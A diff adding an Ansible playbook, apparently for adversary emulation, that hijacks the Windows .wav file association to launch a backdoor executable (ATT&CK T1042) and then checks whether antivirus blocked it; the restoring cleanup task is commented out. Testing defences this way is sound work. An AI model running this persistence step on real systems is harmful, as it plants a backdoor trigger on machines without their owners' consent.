@@ -1,0 +1,36 @@
+# attack_technique: T1042
+- name: T1042 - Change Default File Association
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name: change .wav file execution
+      tags: always
+      win_command: |
+        assoc .wav={{ backdoor_exe }}
+        
+    - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+      tags: always
+      wait_for: timeout=10
+      delegate_to: localhost
+      
+    - name: Check new assoc
+      tags: always
+      win_command: |
+        assoc .wav
+      register: T1042
+      
+    - name: check if playbook was blocked
+      tags: always
+      debug: msg="Playbook Completed#T1042#blocked#win#"
+      when: {{ backdoor_exe }} not in T1042.value       
+    - name: check if playbook was successfull
+      tags: always
+      debug: msg="Playbook Completed#T1042#passed#win#"
+      when: {{ backdoor_exe }} in T1042.value
+      
+    #- name: CLEANUP - Restore change .wav file execution
+    #  tags: always
+    #  win_command: |
+    #    assoc .wav=WMP11.AssocFile.WAV
+    #  when: {{ backdoor_exe }} in T1042.value
